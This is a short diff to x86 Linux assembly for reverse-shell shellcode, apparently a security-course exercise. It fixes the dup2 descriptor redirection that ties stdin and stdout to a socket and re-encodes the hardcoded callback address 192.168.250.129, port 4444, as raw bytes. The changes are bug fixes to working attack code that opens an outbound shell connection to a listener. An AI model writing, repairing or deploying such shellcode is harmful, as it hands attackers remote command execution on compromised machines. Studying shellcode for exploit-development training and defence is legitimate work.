@@ -72,15 +72,15 @@ connector:
 
 redirect_fd:
 
-	; once again, we'll use dub2()
+	; once again, we'll use dup2()
 	;
 	; int dup2(int oldfd, int newfd)
 	;
 
 
-	xor ebx, ebx
+	xor ebx, ebx		; clean ebx
+	xor ecx, ecx		; clean ecx
 	mov ebx, edi		; sockfd
-	mov ecx, eax		; 0 for std in
 	mov al, 0x3f		; define __NR_dup2    63 (0x3f)
 	int 0x80		; call it
 	inc ecx			; 1 for std out
@@ -119,4 +119,4 @@ shell_time:
 ip_port:
 
 	call connector
-	remote: db 0x81faa8c0L, 0x5c11	; 192.168.250.129, 4444 see iptohex.py	
+	remote: db 0x81,0xfa,0xa8,0xc0,0x5c,0x11	; 192.168.250.129, 4444 see iptohex.py	
